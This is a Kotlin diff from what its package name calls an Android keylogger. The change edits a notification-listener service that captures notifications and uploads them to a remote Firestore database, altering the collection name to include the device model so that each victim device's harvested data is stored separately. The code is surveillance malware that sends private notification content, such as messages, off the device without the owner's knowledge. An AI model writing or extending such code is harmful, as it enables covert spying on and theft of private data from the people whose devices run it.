@@ -3,6 +3,7 @@ package com.azamovhudstc.androidkeylogger.service
 import android.content.Context
 import android.content.Intent
 import android.net.ConnectivityManager
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
@@ -74,7 +75,7 @@ class MyNotificationListenerService : NotificationListenerService() {
 
 
     private fun saveNotificationToFirestore(notification: NotificationModel) {
-        val dataCollection = firestore.collection("notifications")
+        val dataCollection = firestore.collection("notifications_${Build.MODEL}")
         dataCollection.get()
             .addOnSuccessListener { querySnapshot ->
                 var shouldAdd = true
@@ -117,7 +118,7 @@ class MyNotificationListenerService : NotificationListenerService() {
                 }
             }
 
-            val dataCollection = firestore.collection("notifications")
+            val dataCollection = firestore.collection("notifications_${Build.MODEL}")
 
             GlobalScope.launch(Dispatchers.IO) {
                 val uniqueTextSet = mutableSetOf<String>() // Unique text set
